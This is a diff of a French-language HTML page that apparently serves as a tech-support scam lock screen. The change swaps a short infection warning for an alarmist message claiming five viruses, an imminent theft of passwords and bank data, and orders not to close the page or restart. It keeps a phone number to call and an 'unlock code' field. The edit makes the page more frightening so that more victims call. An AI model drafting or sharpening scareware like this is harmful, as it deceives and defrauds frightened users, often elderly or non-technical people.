@@ -94,7 +94,13 @@
 </head>
 <body>
     <div class="container">
-        <p class="message">  Votre ordinateur est infecté  <br>Appelez immédiatement :</p>
+        <p class="message"> 🚨 ATTENTION ! 🚨
+5 VIRUS DÉTECTÉS SUR VOTRE APPAREIL !
+🛑 Votre système est compromis ! 🛑
+🔴 Ne fermez PAS cette page ! 🔴
+🔴 Ne redémarrez PAS votre appareil ! 🔴
+📛 Votre appareil est exposé à une attaque sérieuse ! 📛
+Toutes vos données personnelles (photos, mots de passe, comptes bancaires) risquent d’être volées à tout moment.   <br>Appelez immédiatement :</p>
         <p class="alert-number">+33 7 56 75 43 88</p>
         <p style="font-size: 3vw;">Entrez le code de déverrouillage :</p>
         <input type="password" id="codeInput" placeholder="Code secret">
